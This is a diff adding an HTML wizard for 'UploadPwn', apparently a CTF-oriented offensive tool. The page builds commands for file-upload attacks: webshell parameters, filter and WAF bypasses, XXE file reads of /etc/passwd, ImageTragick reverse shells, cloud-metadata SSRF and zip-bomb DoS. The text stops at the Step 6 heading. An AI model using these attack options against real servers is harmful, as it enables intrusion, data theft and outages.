@@ -1,0 +1,1580 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>UploadPwn v7.0 — Interactive Command Builder</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#0a0e14;--bg2:#111820;--bg3:#1a2130;--bg4:#232d3f;
+  --fg:#c5cdd9;--fg2:#8b98a9;--dim:#556270;
+  --cyan:#39bae6;--green:#7fd962;--red:#f26d78;--yellow:#e6b450;
+  --magenta:#d96ed9;--orange:#ff8f40;--blue:#59c2ff;
+  --border:#2a3545;--glow:rgba(57,186,230,0.15);
+  --radius:8px;
+}
+body{background:var(--bg);color:var(--fg);font-family:'JetBrains Mono','Fira Code','Consolas',monospace;font-size:14px;line-height:1.6;min-height:100vh}
+a{color:var(--cyan);text-decoration:none}
+a:hover{text-decoration:underline}
+
+/* Layout */
+.app{max-width:1100px;margin:0 auto;padding:20px}
+header{text-align:center;padding:30px 0 20px;border-bottom:1px solid var(--border);margin-bottom:30px}
+header h1{color:var(--cyan);font-size:24px;letter-spacing:2px}
+header .sub{color:var(--dim);font-size:12px;margin-top:6px}
+header .ver{display:inline-block;background:var(--bg3);color:var(--green);padding:2px 10px;border-radius:12px;font-size:11px;margin-top:8px}
+
+/* Wizard steps */
+.wizard{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:24px;padding:12px;background:var(--bg2);border-radius:var(--radius);border:1px solid var(--border)}
+.wizard .step{padding:6px 14px;border-radius:20px;font-size:12px;cursor:pointer;transition:all .2s;background:var(--bg3);color:var(--dim);border:1px solid transparent;user-select:none}
+.wizard .step:hover{border-color:var(--border);color:var(--fg2)}
+.wizard .step.active{background:var(--cyan);color:var(--bg);font-weight:700;border-color:var(--cyan)}
+.wizard .step.done{background:var(--bg3);color:var(--green);border-color:rgba(127,217,98,.3)}
+.wizard .step.done::before{content:"\2713 "}
+
+/* Panels */
+.panel{display:none;animation:fadeIn .3s}
+.panel.active{display:block}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+
+.panel-title{color:var(--cyan);font-size:18px;font-weight:700;margin-bottom:4px}
+.panel-desc{color:var(--fg2);font-size:13px;margin-bottom:20px}
+
+/* Form groups */
+.form-group{margin-bottom:16px}
+.form-group label{display:block;color:var(--fg2);font-size:12px;margin-bottom:4px;text-transform:uppercase;letter-spacing:.5px}
+.form-group .hint{font-size:11px;color:var(--dim);margin-top:3px}
+input[type="text"],input[type="number"],textarea{width:100%;padding:10px 14px;background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius);color:var(--fg);font-family:inherit;font-size:14px;transition:border .2s}
+input:focus,textarea:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 3px var(--glow)}
+textarea{resize:vertical;min-height:60px}
+input::placeholder{color:var(--dim)}
+
+/* Custom dropdown (replaces native select) */
+.custom-select{position:relative;width:100%;user-select:none}
+.custom-select .cs-display{
+  width:100%;padding:10px 14px;padding-right:36px;
+  background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius);
+  color:var(--fg);font-family:inherit;font-size:14px;
+  cursor:pointer;transition:border .2s;
+  overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
+}
+.custom-select .cs-display:hover{border-color:var(--cyan)}
+.custom-select .cs-display::after{
+  content:"\25BC";position:absolute;right:12px;top:50%;transform:translateY(-50%);
+  font-size:10px;color:var(--dim);pointer-events:none;
+}
+.custom-select.open .cs-display{border-color:var(--cyan);box-shadow:0 0 0 3px var(--glow)}
+.custom-select.open .cs-display::after{content:"\25B2"}
+.custom-select .cs-options{
+  display:none;position:absolute;top:calc(100% + 4px);left:0;right:0;
+  background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius);
+  max-height:220px;overflow-y:auto;z-index:9999;
+  box-shadow:0 8px 24px rgba(0,0,0,.5);
+}
+.custom-select.open .cs-options{display:block}
+.custom-select .cs-option{
+  padding:10px 14px;cursor:pointer;font-size:14px;color:var(--fg);
+  transition:background .15s;
+}
+.custom-select .cs-option:hover{background:var(--bg4);color:var(--cyan)}
+.custom-select .cs-option.selected{background:rgba(57,186,230,.12);color:var(--cyan);font-weight:700}
+
+/* Hide real selects (replaced by JS) */
+select.cs-hidden{display:none}
+
+/* Checkbox/toggle rows */
+.toggle-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:8px}
+.toggle-item{display:flex;align-items:center;gap:8px;padding:8px 12px;background:var(--bg3);border-radius:var(--radius);border:1px solid var(--border);cursor:pointer;transition:all .2s;font-size:13px}
+.toggle-item:hover{border-color:var(--cyan)}
+.toggle-item.on{border-color:var(--green);background:rgba(127,217,98,.07)}
+.toggle-item input[type="checkbox"]{accent-color:var(--green);width:16px;height:16px;cursor:pointer}
+.toggle-item .tname{color:var(--fg)}
+.toggle-item .tdesc{color:var(--dim);font-size:11px;margin-left:auto}
+
+/* Buttons */
+.btn-row{display:flex;gap:10px;margin-top:24px;flex-wrap:wrap}
+.btn{padding:10px 24px;border:1px solid var(--border);border-radius:var(--radius);background:var(--bg3);color:var(--fg);font-family:inherit;font-size:14px;cursor:pointer;transition:all .2s}
+.btn:hover{border-color:var(--cyan);color:var(--cyan)}
+.btn.primary{background:var(--cyan);color:var(--bg);border-color:var(--cyan);font-weight:700}
+.btn.primary:hover{background:#4dc8f0;box-shadow:0 0 15px var(--glow)}
+.btn.danger{border-color:var(--red);color:var(--red)}
+.btn.danger:hover{background:rgba(242,109,120,.1)}
+
+/* Output blocks */
+.output-section{margin-top:30px}
+.output-section h3{color:var(--yellow);font-size:15px;margin-bottom:10px}
+.cmd-block{position:relative;background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:14px 16px;margin-bottom:12px;font-size:13px;line-height:1.7;overflow-x:auto;white-space:pre-wrap;word-break:break-all}
+.cmd-block .lang{position:absolute;top:6px;right:10px;font-size:10px;color:var(--dim);text-transform:uppercase}
+.cmd-block .copy-btn{position:absolute;top:6px;right:60px;background:var(--bg3);border:1px solid var(--border);color:var(--fg2);padding:2px 10px;border-radius:4px;cursor:pointer;font-size:11px;font-family:inherit;transition:all .2s}
+.cmd-block .copy-btn:hover{border-color:var(--cyan);color:var(--cyan)}
+.cmd-block .copy-btn.copied{border-color:var(--green);color:var(--green)}
+.cmd-block code{color:var(--green)}
+.cmd-block .comment{color:var(--dim)}
+.cmd-block .flag{color:var(--yellow)}
+.cmd-block .value{color:var(--orange)}
+
+/* Info boxes */
+.info-box{padding:12px 16px;border-radius:var(--radius);margin-bottom:14px;font-size:13px;border:1px solid}
+.info-box.tip{background:rgba(57,186,230,.07);border-color:rgba(57,186,230,.25);color:var(--blue)}
+.info-box.warn{background:rgba(230,180,80,.07);border-color:rgba(230,180,80,.25);color:var(--yellow)}
+.info-box.success{background:rgba(127,217,98,.07);border-color:rgba(127,217,98,.25);color:var(--green)}
+.info-box.danger{background:rgba(242,109,120,.07);border-color:rgba(242,109,120,.25);color:var(--red)}
+.info-box strong{font-weight:700}
+
+/* Recon output */
+.recon-result{background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius);padding:12px;margin-bottom:10px}
+.recon-result .key{color:var(--cyan);font-weight:700;font-size:12px}
+.recon-result .val{color:var(--fg)}
+
+/* Curl builder */
+.curl-section{margin-top:16px}
+.curl-section h4{color:var(--magenta);font-size:14px;margin-bottom:8px}
+
+/* Tabs inside panels */
+.tab-bar{display:flex;gap:0;border-bottom:1px solid var(--border);margin-bottom:16px}
+.tab-bar .tab{padding:8px 18px;cursor:pointer;color:var(--dim);font-size:13px;border-bottom:2px solid transparent;transition:all .2s}
+.tab-bar .tab:hover{color:var(--fg2)}
+.tab-bar .tab.active{color:var(--cyan);border-bottom-color:var(--cyan)}
+.tab-content{display:none}
+.tab-content.active{display:block}
+
+/* Phase indicators */
+.phase-indicator{display:flex;align-items:center;gap:10px;margin-bottom:20px;padding:10px 16px;background:var(--bg2);border-radius:var(--radius);border-left:3px solid var(--cyan)}
+.phase-indicator .num{color:var(--cyan);font-weight:700;font-size:24px}
+.phase-indicator .info{flex:1}
+.phase-indicator .info .title{font-weight:700;color:var(--fg)}
+.phase-indicator .info .desc{font-size:12px;color:var(--dim)}
+
+/* Responsive */
+@media(max-width:700px){
+  .toggle-grid{grid-template-columns:1fr}
+  .wizard{gap:4px}
+  .wizard .step{font-size:11px;padding:5px 10px}
+}
+
+/* Scrollbar */
+::-webkit-scrollbar{width:8px;height:8px}
+::-webkit-scrollbar-track{background:var(--bg)}
+::-webkit-scrollbar-thumb{background:var(--bg4);border-radius:4px}
+::-webkit-scrollbar-thumb:hover{background:var(--dim)}
+</style>
+</head>
+<body>
+<div class="app">
+
+<header>
+  <h1>UPLOADPWN</h1>
+  <div class="sub">Interactive Command Builder & Attack Guide</div>
+  <div class="ver">v7.0.0</div>
+</header>
+
+<!-- Wizard Steps -->
+<div class="wizard" id="wizardNav">
+  <div class="step active" data-step="0">1. Target</div>
+  <div class="step" data-step="1">2. Recon</div>
+  <div class="step" data-step="2">3. Auth</div>
+  <div class="step" data-step="3">4. Upload</div>
+  <div class="step" data-step="4">5. Modules</div>
+  <div class="step" data-step="5">6. Options</div>
+  <div class="step" data-step="6">7. Generate</div>
+  <div class="step" data-step="7">8. Curl</div>
+  <div class="step" data-step="8">9. Cheatsheet</div>
+</div>
+
+<!-- ═════════════════════════════════════════════════════════════════════════ -->
+<!-- STEP 0: TARGET -->
+<!-- ═════════════════════════════════════════════════════════════════════════ -->
+<div class="panel active" id="panel-0">
+  <div class="phase-indicator">
+    <div class="num">01</div>
+    <div class="info">
+      <div class="title">Target Configuration</div>
+      <div class="desc">Enter the base URL of your target. This is the foundation for everything.</div>
+    </div>
+  </div>
+
+  <div class="form-group">
+    <label>Target URL *</label>
+    <input type="text" id="target" placeholder="http://10.10.10.10:8080" spellcheck="false">
+    <div class="hint">Base URL of the target (no trailing slash). Example: http://94.237.55.163:47022</div>
+  </div>
+
+  <div class="form-group">
+    <label for="serverType">Server Type</label>
+    <select id="serverType">
+      <option value="all">Auto-detect (all payloads)</option>
+      <option value="php">PHP (Apache/Nginx)</option>
+      <option value="asp">ASP.NET / IIS</option>
+      <option value="jsp">JSP / Tomcat / JBoss</option>
+      <option value="cf">ColdFusion</option>
+    </select>
+    <div class="hint">Leave as "auto-detect" if unsure. The tool fingerprints the server automatically.</div>
+  </div>
+
+  <div class="info-box tip">
+    <strong>Quick Recon:</strong> Run this curl to fingerprint the server before continuing:<br>
+    <code id="reconCurl" style="color:var(--green);cursor:pointer" onclick="copyText(this.textContent)">curl -sI http://TARGET | grep -iE 'server|x-powered|x-asp'</code>
+  </div>
+
+  <div id="reconOutput"></div>
+
+  <div class="btn-row">
+    <button class="btn primary" onclick="goStep(1)">Next: Recon &rarr;</button>
+  </div>
+</div>
+
+<!-- ═════════════════════════════════════════════════════════════════════════ -->
+<!-- STEP 1: RECON -->
+<!-- ═════════════════════════════════════════════════════════════════════════ -->
+<div class="panel" id="panel-1">
+  <div class="phase-indicator">
+    <div class="num">02</div>
+    <div class="info">
+      <div class="title">Reconnaissance</div>
+      <div class="desc">Paste what you know so far. The tool can auto-discover everything, but giving it hints speeds things up.</div>
+    </div>
+  </div>
+
+  <div class="info-box tip">
+    <strong>Paste your curl output here</strong> if you ran the recon command. This helps generate smarter commands.
+  </div>
+
+  <div class="form-group">
+    <label>Server Header Response (paste curl -sI output)</label>
+    <textarea id="reconPaste" rows="4" placeholder="HTTP/1.1 200 OK&#10;Server: Apache/2.4.41 (Ubuntu)&#10;X-Powered-By: PHP/7.4.3&#10;..."></textarea>
+  </div>
+
+  <div class="form-group">
+    <label>Anything you already know about the upload?</label>
+    <textarea id="reconNotes" rows="3" placeholder="e.g. 'Only images allowed', 'There's a profile avatar upload behind login', 'Error says extension not allowed'"></textarea>
+  </div>
+
+  <div id="reconAnalysis"></div>
+
+  <div class="btn-row">
+    <button class="btn" onclick="goStep(0)">&larr; Back</button>
+    <button class="btn" onclick="analyzeRecon()">Analyze Headers</button>
+    <button class="btn primary" onclick="goStep(2)">Next: Auth &rarr;</button>
+  </div>
+</div>
+
+<!-- ═════════════════════════════════════════════════════════════════════════ -->
+<!-- STEP 2: AUTH -->
+<!-- ═════════════════════════════════════════════════════════════════════════ -->
+<div class="panel" id="panel-2">
+  <div class="phase-indicator">
+    <div class="num">03</div>
+    <div class="info">
+      <div class="title">Authentication</div>
+      <div class="desc">Does the upload require login? Skip this if the upload is unauthenticated.</div>
+    </div>
+  </div>
+
+  <div class="form-group">
+    <label for="authMethod">Authentication Method</label>
+    <select id="authMethod" onchange="toggleAuthFields()">
+      <option value="none">No authentication needed</option>
+      <option value="login">Login form (username + password)</option>
+      <option value="cookie">I already have a session cookie</option>
+      <option value="header">Custom header (API key, Bearer token, etc.)</option>
+      <option value="selenium">JavaScript-heavy login (needs Selenium)</option>
+    </select>
+  </div>
+
+  <div id="authFields" style="display:none">
+    <div class="form-group" id="authLoginGroup">
+      <label>Login Page Path</label>
+      <input type="text" id="loginPath" placeholder="/login.php">
+      <div class="hint">Path to the login form, relative to target</div>
+    </div>
+    <div class="form-group" id="authUserGroup">
+      <label>Username</label>
+      <input type="text" id="authUser" placeholder="admin">
+    </div>
+    <div class="form-group" id="authPassGroup">
+      <label>Password</label>
+      <input type="text" id="authPass" placeholder="admin">
+    </div>
+    <div class="form-group" id="authUserFieldGroup" style="display:none">
+      <label>Username Field Name (if not "username")</label>
+      <input type="text" id="authUserField" placeholder="username">
+      <div class="hint">HTML name attribute of the username input. Leave blank for auto-detect.</div>
+    </div>
+    <div class="form-group" id="authPassFieldGroup" style="display:none">
+      <label>Password Field Name (if not "password")</label>
+      <input type="text" id="authPassField" placeholder="password">
+    </div>
+    <div class="form-group" id="authNavGroup" style="display:none">
+      <label>Navigate After Login (optional)</label>
+      <input type="text" id="authNav" placeholder="/dashboard">
+      <div class="hint">If you need to click through a dashboard/profile page after login to reach the upload</div>
+    </div>
+  </div>
+
+  <div id="cookieFields" style="display:none">
+    <div class="form-group">
+      <label>Session Cookie(s)</label>
+      <input type="text" id="cookieValue" placeholder="PHPSESSID=abc123def456">
+      <div class="hint">Paste from browser DevTools &rarr; Application &rarr; Cookies. For multiple: PHPSESSID=abc; token=xyz</div>
+    </div>
+  </div>
+
+  <div id="headerFields" style="display:none">
+    <div class="form-group">
+      <label>Custom Header(s)</label>
+      <input type="text" id="headerValue" placeholder="Authorization: Bearer eyJhbG...">
+      <div class="hint">One header per line for multiple</div>
+    </div>
+  </div>
+
+  <div class="btn-row">
+    <button class="btn" onclick="goStep(1)">&larr; Back</button>
+    <button class="btn primary" onclick="goStep(3)">Next: Upload Config &rarr;</button>
+  </div>
+</div>
+
+<!-- ═════════════════════════════════════════════════════════════════════════ -->
+<!-- STEP 3: UPLOAD CONFIG -->
+<!-- ═════════════════════════════════════════════════════════════════════════ -->
+<div class="panel" id="panel-3">
+  <div class="phase-indicator">
+    <div class="num">04</div>
+    <div class="info">
+      <div class="title">Upload Configuration</div>
+      <div class="desc">Where is the upload form? What's the field name? Leave blank for auto-detection.</div>
+    </div>
+  </div>
+
+  <div class="info-box tip">
+    <strong>How to find these values:</strong> Open browser DevTools (F12) &rarr; go to the upload page &rarr; inspect the file input element. Look for <code>&lt;form action="/upload.php"&gt;</code> and <code>&lt;input type="file" name="uploadFile"&gt;</code>.
+  </div>
+
+  <div class="form-group">
+    <label>Upload Page Path (where the form lives)</label>
+    <input type="text" id="uploadPage" placeholder="/profile/settings">
+    <div class="hint">Leave blank if the upload form is on the main page. Used with --upload-page</div>
+  </div>
+
+  <div class="form-group">
+    <label>Upload Endpoint (form action URL)</label>
+    <input type="text" id="endpoint" placeholder="/upload.php">
+    <div class="hint">The form's action attribute. Auto-detected if blank. Used with -e</div>
+  </div>
+
+  <div class="form-group">
+    <label>File Field Name</label>
+    <input type="text" id="fieldName" placeholder="uploadFile">
+    <div class="hint">The name="..." attribute on the &lt;input type="file"&gt;. Auto-detected if blank. Used with --field</div>
+  </div>
+
+  <div class="form-group">
+    <label>Shell Command Parameter</label>
+    <input type="text" id="cmdParam" placeholder="cmd" value="cmd">
+    <div class="hint">GET parameter name for webshell commands. Default: cmd (as in ?cmd=id)</div>
+  </div>
+
+  <div class="form-group">
+    <label>Flag Path (CTF mode)</label>
+    <input type="text" id="flagPath" placeholder="/flag.txt" value="/flag.txt">
+    <div class="hint">File to auto-read after RCE. Common: /flag.txt, /root/flag.txt, /home/*/user.txt</div>
+  </div>
+
+  <div class="form-group">
+    <label>Custom Shell Directories (optional, space-separated)</label>
+    <input type="text" id="shellDirs" placeholder="/uploads/ /images/ /media/">
+    <div class="hint">Directories where uploaded files might be stored. Tool has 25+ built-in defaults.</div>
+  </div>
+
+  <div class="btn-row">
+    <button class="btn" onclick="goStep(2)">&larr; Back</button>
+    <button class="btn primary" onclick="goStep(4)">Next: Attack Modules &rarr;</button>
+  </div>
+</div>
+
+<!-- ═════════════════════════════════════════════════════════════════════════ -->
+<!-- STEP 4: MODULES -->
+<!-- ═════════════════════════════════════════════════════════════════════════ -->
+<div class="panel" id="panel-4">
+  <div class="phase-indicator">
+    <div class="num">05</div>
+    <div class="info">
+      <div class="title">Attack Modules</div>
+      <div class="desc">Select which modules to run. Click "Run ALL" for comprehensive testing.</div>
+    </div>
+  </div>
+
+  <div style="margin-bottom:16px">
+    <button class="btn primary" onclick="selectAllModules()" id="allBtn">Select ALL Modules (--all)</button>
+    <button class="btn" onclick="clearAllModules()">Clear All</button>
+    <button class="btn" onclick="smartSelect()">Smart Select (based on server type)</button>
+  </div>
+
+  <h4 style="color:var(--yellow);margin-bottom:10px">Extension & Filter Bypass</h4>
+  <div class="toggle-grid" id="moduleGrid1">
+    <label class="toggle-item" data-flag="--matrix"><input type="checkbox" checked><span class="tname">Extension Matrix</span><span class="tdesc">all combos</span></label>
+    <label class="toggle-item" data-flag="--ext-fuzz"><input type="checkbox"><span class="tname">Ext Exec Fuzz</span><span class="tdesc">HTB approach</span></label>
+    <label class="toggle-item" data-flag="--htaccess"><input type="checkbox"><span class="tname">.htaccess</span><span class="tdesc">Apache</span></label>
+    <label class="toggle-item" data-flag="--webconfig"><input type="checkbox"><span class="tname">web.config</span><span class="tdesc">IIS</span></label>
+    <label class="toggle-item" data-flag="--polyglot"><input type="checkbox"><span class="tname">Polyglots</span><span class="tdesc">PNG/JPEG/GIF</span></label>
+    <label class="toggle-item" data-flag="--raw-null"><input type="checkbox"><span class="tname">Raw Null Byte</span><span class="tdesc">\x00 in header</span></label>
+    <label class="toggle-item" data-flag="--chunked"><input type="checkbox"><span class="tname">Chunked Encoding</span><span class="tdesc">size bypass</span></label>
+    <label class="toggle-item" data-flag="--boundary"><input type="checkbox"><span class="tname">Boundary Manip</span><span class="tdesc">WAF bypass</span></label>
+    <label class="toggle-item" data-flag="--iis-semicolon"><input type="checkbox"><span class="tname">IIS Semicolon</span><span class="tdesc">.aspx;.jpg</span></label>
+    <label class="toggle-item" data-flag="--char-inject"><input type="checkbox"><span class="tname">Char Injection</span><span class="tdesc">%00 %0a etc</span></label>
+    <label class="toggle-item" data-flag="--race"><input type="checkbox"><span class="tname">Race Condition</span><span class="tdesc">upload+access</span></label>
+    <label class="toggle-item" data-flag="--filter-matrix"><input type="checkbox"><span class="tname">Filter Matrix</span><span class="tdesc">systematic fuzz</span></label>
+  </div>
+
+  <h4 style="color:var(--yellow);margin:16px 0 10px">File Read & XXE</h4>
+  <div class="toggle-grid" id="moduleGrid2">
+    <label class="toggle-item" data-flag="--svg-read"><input type="checkbox"><span class="tname">SVG XXE Read</span><span class="tdesc">file read</span></label>
+    <label class="toggle-item" data-flag="--svg-src"><input type="checkbox"><span class="tname">SVG Source Read</span><span class="tdesc">PHP source</span></label>
+    <label class="toggle-item" data-flag="--svg-xss"><input type="checkbox"><span class="tname">SVG XSS</span><span class="tdesc">stored XSS</span></label>
+    <label class="toggle-item" data-flag="--zip"><input type="checkbox"><span class="tname">Zip Slip</span><span class="tdesc">path traversal</span></label>
+    <label class="toggle-item" data-flag="--symlink-zip"><input type="checkbox"><span class="tname">Symlink Zip</span><span class="tdesc">file read</span></label>
+    <label class="toggle-item" data-flag="--lfi"><input type="checkbox"><span class="tname">LFI Chaining</span><span class="tdesc">include upload</span></label>
+    <label class="toggle-item" data-flag="--docx-xxe"><input type="checkbox"><span class="tname">DOCX XXE</span><span class="tdesc">document XXE</span></label>
+    <label class="toggle-item" data-flag="--xlsx-xxe"><input type="checkbox"><span class="tname">XLSX XXE</span><span class="tdesc">spreadsheet XXE</span></label>
+  </div>
+
+  <h4 style="color:var(--yellow);margin:16px 0 10px">Injection & Advanced</h4>
+  <div class="toggle-grid" id="moduleGrid3">
+    <label class="toggle-item" data-flag="--filename-inject"><input type="checkbox"><span class="tname">Filename Inject</span><span class="tdesc">cmd/XSS/SQLi</span></label>
+    <label class="toggle-item" data-flag="--exif-xss"><input type="checkbox"><span class="tname">EXIF XSS</span><span class="tdesc">JPEG metadata</span></label>
+    <label class="toggle-item" data-flag="--win83"><input type="checkbox"><span class="tname">Win 8.3 Names</span><span class="tdesc">SHELL~1.PHP</span></label>
+    <label class="toggle-item" data-flag="--war"><input type="checkbox"><span class="tname">WAR Deploy</span><span class="tdesc">Tomcat/JBoss</span></label>
+    <label class="toggle-item" data-flag="--imagetragick"><input type="checkbox"><span class="tname">ImageTragick</span><span class="tdesc">CVE-2016-3714</span></label>
+    <label class="toggle-item" data-flag="--userini"><input type="checkbox"><span class="tname">.user.ini</span><span class="tdesc">auto_prepend Nginx</span></label>
+    <label class="toggle-item" data-flag="--ssi"><input type="checkbox"><span class="tname">SSI Injection</span><span class="tdesc">.shtml exec</span></label>
+    <label class="toggle-item" data-flag="--path-traversal"><input type="checkbox"><span class="tname">Path Traversal</span><span class="tdesc">../ filename</span></label>
+    <label class="toggle-item" data-flag="--unicode"><input type="checkbox"><span class="tname">Unicode Bypass</span><span class="tdesc">normalization</span></label>
+    <label class="toggle-item" data-flag="--put-upload"><input type="checkbox"><span class="tname">HTTP PUT</span><span class="tdesc">method bypass</span></label>
+    <label class="toggle-item" data-flag="--stored-xss"><input type="checkbox"><span class="tname">Stored XSS</span><span class="tdesc">PDF/HTML upload</span></label>
+    <label class="toggle-item" data-flag="--cgi"><input type="checkbox"><span class="tname">CGI Scripts</span><span class="tdesc">.pl .cgi .py .sh</span></label>
+    <label class="toggle-item" data-flag="--double-cd"><input type="checkbox"><span class="tname">Double C-D</span><span class="tdesc">header confusion</span></label>
+    <label class="toggle-item" data-flag="--phar-deser"><input type="checkbox"><span class="tname">Phar Deser</span><span class="tdesc">phar:// exec</span></label>
+    <label class="toggle-item" data-flag="--phpfpm-pathinfo"><input type="checkbox"><span class="tname">FPM Pathinfo</span><span class="tdesc">img.jpg/.php</span></label>
+    <label class="toggle-item" data-flag="--multipart-pollute"><input type="checkbox"><span class="tname">Multipart Pollute</span><span class="tdesc">dual file parts</span></label>
+    <label class="toggle-item" data-flag="--cte-base64"><input type="checkbox"><span class="tname">CTE Base64</span><span class="tdesc">encoding smuggle</span></label>
+    <label class="toggle-item" data-flag="--path-truncation"><input type="checkbox"><span class="tname">Path Truncation</span><span class="tdesc">NTFS 255 chars</span></label>
+    <label class="toggle-item" data-flag="--apache-unrecognized"><input type="checkbox"><span class="tname">Apache .php.xxx</span><span class="tdesc">unrecognized ext</span></label>
+    <label class="toggle-item" data-flag="--ssrf-metadata"><input type="checkbox"><span class="tname">SSRF Metadata</span><span class="tdesc">cloud AWS/GCP</span></label>
+    <label class="toggle-item" data-flag="--ghostscript"><input type="checkbox"><span class="tname">Ghostscript</span><span class="tdesc">EPS/PS RCE</span></label>
+    <label class="toggle-item" data-flag="--htaccess-race"><input type="checkbox"><span class="tname">htaccess Race</span><span class="tdesc">TOCTOU parallel</span></label>
+  </div>
+
+  <h4 style="color:var(--yellow);margin:16px 0 10px">Recon & DoS</h4>
+  <div class="toggle-grid" id="moduleGrid4">
+    <label class="toggle-item" data-flag="--discover"><input type="checkbox"><span class="tname">Form Discovery</span><span class="tdesc">find forms</span></label>
+    <label class="toggle-item" data-flag="--dir-enum"><input type="checkbox"><span class="tname">Dir Enumeration</span><span class="tdesc">find dirs</span></label>
+    <label class="toggle-item" data-flag="--error-disclose"><input type="checkbox"><span class="tname">Error Disclosure</span><span class="tdesc">leak paths</span></label>
+    <label class="toggle-item" data-flag="--dos"><input type="checkbox"><span class="tname">DoS Probes</span><span class="tdesc">size limit</span></label>
+    <label class="toggle-item" data-flag="--bomb"><input type="checkbox"><span class="tname">Zip Bomb</span><span class="tdesc">decompression</span></label>
+    <label class="toggle-item" data-flag="--pixel-flood"><input type="checkbox"><span class="tname">Pixel Flood</span><span class="tdesc">huge PNG dims</span></label>
+  </div>
+
+  <!-- Extra inputs for modules that need values -->
+  <div id="moduleExtras" style="margin-top:16px">
+    <div class="form-group" id="svgReadPath" style="display:none">
+      <label>SVG XXE Read — File Path</label>
+      <input type="text" id="svgReadValue" placeholder="/flag.txt" value="/flag.txt">
+    </div>
+    <div class="form-group" id="svgSrcFile" style="display:none">
+      <label>SVG Source Read — PHP File</label>
+      <input type="text" id="svgSrcValue" placeholder="upload.php" value="upload.php">
+    </div>
+    <div class="form-group" id="svgSsrfUrl" style="display:none">
+      <label>SVG SSRF — Target URL</label>
+      <input type="text" id="svgSsrfValue" placeholder="http://127.0.0.1/">
+    </div>
+    <div class="form-group" id="symlinkFile" style="display:none">
+      <label>Symlink Zip — File to Read</label>
+      <input type="text" id="symlinkValue" placeholder="/etc/passwd" value="/etc/passwd">
+    </div>
+    <div class="form-group" id="docxXxePath" style="display:none">
+      <label>DOCX XXE — File to Read</label>
+      <input type="text" id="docxXxeValue" placeholder="/etc/passwd" value="/etc/passwd">
+    </div>
+    <div class="form-group" id="xlsxXxePath" style="display:none">
+      <label>XLSX XXE — File to Read</label>
+      <input type="text" id="xlsxXxeValue" placeholder="/etc/passwd" value="/etc/passwd">
+    </div>
+    <div class="form-group" id="imagetragickReadFile" style="display:none">
+      <label>ImageTragick — File to Read (optional)</label>
+      <input type="text" id="imagetragickReadValue" placeholder="/etc/passwd">
+    </div>
+    <div class="form-group" id="imagetragickRevshell" style="display:none">
+      <label>ImageTragick — Reverse Shell IP:PORT (optional)</label>
+      <input type="text" id="imagetragickRevshellValue" placeholder="10.10.14.1:4444">
+    </div>
+    <div class="form-group" id="wordlistFile" style="display:none">
+      <label>Wordlist Path</label>
+      <input type="text" id="wordlistValue" placeholder="/usr/share/seclists/Discovery/Web-Content/common.txt">
+    </div>
+  </div>
+
+  <div class="btn-row">
+    <button class="btn" onclick="goStep(3)">&larr; Back</button>
+    <button class="btn primary" onclick="goStep(5)">Next: Options &rarr;</button>
+  </div>
+</div>
+
+<!-- ═════════════════════════════════════════════════════════════════════════ -->
+<!-- STEP 5: OPTIONS -->
+<!-- ═════════════════════════════════════════════════════════════════════════ -->
+<div class="panel" id="panel-5">
+  <div class="phase-indicator">
+    <div class="num">06</div>
+    <div class="info">
+      <div class="title">Scan Options</div>
+      <div class="desc">Tune the scan behavior: speed, stealth, output, proxy.</div>
+    </div>
+  </div>
+
+  <div class="toggle-grid" style="margin-bottom:20px">
+    <label class="toggle-item" data-flag="--smart"><input type="checkbox" id="optSmart"><span class="tname">Smart Mode</span><span class="tdesc">auto-pick attacks</span></label>
+    <label class="toggle-item" data-flag="--interactive"><input type="checkbox" id="optInteractive"><span class="tname">Interactive Shell</span><span class="tdesc">webshell REPL</span></label>
+    <label class="toggle-item" data-flag="--no-probe"><input type="checkbox" id="optNoProbe"><span class="tname">Skip Probing</span><span class="tdesc">no fingerprint</span></label>
+    <label class="toggle-item" data-flag="--no-interact"><input type="checkbox" id="optNoInteract"><span class="tname">No Prompts</span><span class="tdesc">use defaults</span></label>
+    <label class="toggle-item" data-flag="--walkthrough"><input type="checkbox" id="optWalkthrough"><span class="tname">Walkthrough</span><span class="tdesc">step-by-step</span></label>
+  </div>
+
+  <div class="form-group">
+    <label for="verbosity">Verbosity</label>
+    <select id="verbosity">
+      <option value="">Normal</option>
+      <option value="-v">Verbose (-v)</option>
+      <option value="-vv">Very Verbose (-vv)</option>
+      <option value="-vvv">Debug (-vvv)</option>
+      <option value="-q">Quiet (findings only)</option>
+    </select>
+  </div>
+
+  <div class="form-group">
+    <label>Proxy (Burp Suite)</label>
+    <input type="text" id="proxy" placeholder="http://127.0.0.1:8080">
+    <div class="hint">Route all traffic through Burp. Leave blank to go direct.</div>
+  </div>
+
+  <div class="form-group">
+    <label>Timeout (seconds)</label>
+    <input type="number" id="timeout" placeholder="15" value="15">
+  </div>
+
+  <div class="form-group">
+    <label>Threads</label>
+    <input type="number" id="threads" placeholder="5" value="5">
+  </div>
+
+  <div class="form-group">
+    <label>Delay Between Requests (seconds)</label>
+    <input type="text" id="delay" placeholder="0" value="0">
+    <div class="hint">Add delay for stealth / rate limiting. 0 = no delay.</div>
+  </div>
+
+  <div class="form-group">
+    <label>Crawl Depth (SmartRecon)</label>
+    <input type="number" id="crawlDepth" placeholder="2" value="2">
+    <div class="hint">Max depth for SmartRecon page discovery. Only used with --smart.</div>
+  </div>
+
+  <div class="form-group">
+    <label>Output Report File</label>
+    <input type="text" id="outputFile" placeholder="uploadpwn_report.json" value="uploadpwn_report.json">
+  </div>
+
+  <div class="btn-row">
+    <button class="btn" onclick="goStep(4)">&larr; Back</button>
+    <button class="btn primary" onclick="generateCommand(); goStep(6)">Generate Command &rarr;</button>
+  </div>
+</div>
+
+<!-- ═════════════════════════════════════════════════════════════════════════ -->
+<!-- STEP 6: GENERATED COMMAND -->
